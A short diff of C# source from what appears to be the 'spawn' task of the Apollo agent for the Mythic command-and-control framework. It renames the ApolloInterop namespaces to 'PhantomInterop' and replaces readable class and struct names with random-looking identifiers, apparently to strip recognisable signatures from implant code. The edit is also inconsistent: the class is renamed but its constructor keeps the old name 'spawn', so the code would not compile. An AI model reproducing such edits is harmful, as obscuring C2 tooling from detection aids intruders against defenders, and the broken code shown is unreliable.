@@ -6,22 +6,22 @@
 
 #if SPAWN
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 
 namespace Tasks
 {
-    public class spawn : Tasking
+    public class DynamicMonitorD0E4 : Tasking
     {
         [DataContract]
-        internal struct SpawnParameters
+        internal struct DynamicResolver29B8
         {
             [DataMember(Name = "template")]
             public string Template;
         }
-        public spawn(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public spawn(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
         }
 
